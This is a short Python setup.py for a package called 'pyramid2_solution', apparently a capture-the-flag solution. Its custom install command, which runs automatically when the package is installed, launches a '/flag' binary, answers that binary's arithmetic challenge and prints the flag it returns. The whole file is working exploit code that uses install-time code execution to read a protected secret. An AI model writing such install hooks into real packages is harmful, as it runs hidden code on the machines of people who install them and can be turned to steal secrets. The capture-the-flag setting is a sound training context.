# setup.py
from setuptools import setup
from setuptools.command.install import install
import subprocess
import re

def get_flag():
    try:
        proc = subprocess.Popen(['/flag'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
        question = proc.stdout.readline()
        print(question)
        numbers = list(map(int, re.findall(r'\d+', question)))
        if len(numbers) == 3:
            A, B, C = numbers
            answer = A * B + C
            proc.stdin.write(f'{answer}\n')
            proc.stdin.flush()
            flag = proc.stdout.readline()
            print(flag)
        else:
            print('Failed to parse question')
    except FileNotFoundError:
        print("The '/flag' binary was not found. Please ensure it is available.")

class CustomInstallCommand(install):
    def run(self):
        get_flag()  # Execute get_flag during installation
        install.run(self)

setup(
    name='pyramid2_solution',
    version='0.0.3',  # Incremented version
    packages=['pyramid2_solution'],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
